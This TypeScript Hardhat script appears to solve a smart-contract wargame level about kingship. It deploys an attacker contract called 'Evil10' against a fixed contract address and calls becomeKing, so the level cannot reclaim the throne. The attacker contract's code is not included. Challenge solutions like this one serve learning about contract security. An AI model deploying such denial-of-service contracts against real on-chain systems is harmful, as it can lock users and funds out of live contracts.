import { ethers } from "hardhat";
import { Evil10__factory } from "../typechain-types";

async function main() {
  // When you submit the instance back to the level, the level is going to
  // reclaim kingship.
  // You will beat the level if you can avoid such a self proclamation.

  let tx; // will have to wait for each tx

  let [deployer] = await ethers.getSigners();
  let contract = "0x5884F981fC9BEF726b8b8E08FC649808dd3A961a";
  let evil = await new Evil10__factory(deployer).deploy(contract);

  tx = await evil.becomeKing({
    value: ethers.utils.parseEther("0.001"),
    gasLimit: 100_000,
  });
  await tx.wait();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
